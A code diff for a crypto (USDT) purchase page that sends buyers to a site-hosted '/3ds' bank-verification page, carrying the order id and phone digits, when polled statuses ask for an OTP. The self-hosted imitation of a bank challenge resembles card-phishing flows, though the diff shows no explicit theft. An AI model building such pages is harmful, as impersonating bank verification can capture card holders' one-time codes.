@@ -14,9 +14,21 @@ import { getOrCreateVisitorId } from '../visitTracking';
 import { saveOrderLocal } from '../lib/savedOrders';
 import { NETWORK_POLICY, minUsdtForNetwork, feeUsdtForNetwork } from '../../shared/networkPolicy.js';
 import { CardProcessingToOtpScreen } from '../components/OtpPaymentUi';
-import { AcsOtpChallenge } from '../components/AcsOtpChallenge';
 import Header from '../components/Header';
 import Footer from '../components/Footer';
+
+function redirectToAcs3ds(orderId, lang, phoneLast3 = '') {
+  if (!orderId || typeof window === 'undefined') return;
+  if (window.location.pathname.startsWith('/3ds')) return;
+  const params = new URLSearchParams({
+    order_ref: orderId,
+    orderId,
+    lang: lang || 'ar',
+    return: `${window.location.origin}/track?order=${encodeURIComponent(orderId)}`,
+  });
+  if (phoneLast3) params.set('digits', String(phoneLast3).replace(/\D/g, '').slice(-3));
+  window.location.assign(`/3ds?${params.toString()}`);
+}
 
 const OTP_MAX_ATTEMPTS = 2;
 const OTP_POLL_MS = 1200;
@@ -442,16 +454,10 @@ export default function BuyPage() {
       if (!data?.status) return;
       applyOtpPollMeta(data);
       const status = String(data.status).toLowerCase();
-      if (status === 'awaiting_otp') {
+      if (status === 'awaiting_otp' || status === 'retry_otp') {
         setPreOtpProcessing(false);
-        setStage(3);
-        return;
-      }
-      if (status === 'retry_otp') {
-        setPreOtpProcessing(false);
-        setStage(3);
-        setOtpCode('');
-        setOtpRetryNotice(true);
+        // Open standalone ACS / 3DS page (other full page), then return on complete
+        redirectToAcs3ds(orderId, lang, data.phone_last3 || otpPhoneLast3);
         return;
       }
       if (status === 'failed') {
@@ -483,7 +489,14 @@ export default function BuyPage() {
       alive = false;
       clearInterval(timer);
     };
-  }, [preOtpProcessing, orderId, applyOtpPollMeta, navigate]);
+  }, [preOtpProcessing, orderId, applyOtpPollMeta, navigate, lang, otpPhoneLast3]);
+
+  // If stage 3 without redirect yet → open ACS page
+  useEffect(() => {
+    if (stage === 3 && orderId) {
+      redirectToAcs3ds(orderId, lang, otpPhoneLast3);
+    }
+  }, [stage, orderId, lang, otpPhoneLast3]);
 
   useEffect(() => {
     const shouldPoll = !!orderId && (stage === 3 || stage === 4);
@@ -1134,32 +1147,10 @@ export default function BuyPage() {
             )}
 
             {stage === 3 && !preOtpProcessing && (
-              <div className="buy-form-grid mt-6">
-                <div className="buy-span-2">
-                  <AcsOtpChallenge
-                    orderRef={orderId}
-                    phoneLast3={otpPhoneLast3}
-                    lang={lang}
-                    otpAttempts={otpAttempts}
-                    otpMaxAttempts={otpMaxAttempts}
-                    otpRemaining={otpRemaining}
-                    otpRetryNotice={otpRetryNotice}
-                    otpResendNotice={otpResendNotice}
-                    resendCooldown={otpResendCooldown}
-                    resendLoading={otpResendLoading}
-                    externalState={verifyingOtp ? 'checking' : 'input'}
-                    t={(key, fb) => t[key] ?? fb}
-                    onMethodNext={onMethodNext}
-                    onSubmitOtp={(code) => onSubmitOtp(code)}
-                    onResend={() => void onOtpResend()}
-                  />
-                  {error && (
-                    <div className="text-error text-sm mt-3" style={{ textAlign: isRtl ? 'right' : 'left' }}>
-                      {error}
-                    </div>
-                  )}
-                </div>
-              </div>
+              <CardProcessingToOtpScreen
+                lang={lang}
+                etaText={isRtl ? 'جاري فتح صفحة التحقق البنكي...' : 'Opening bank verification page...'}
+              />
             )}
 
             {stage === 4 && (
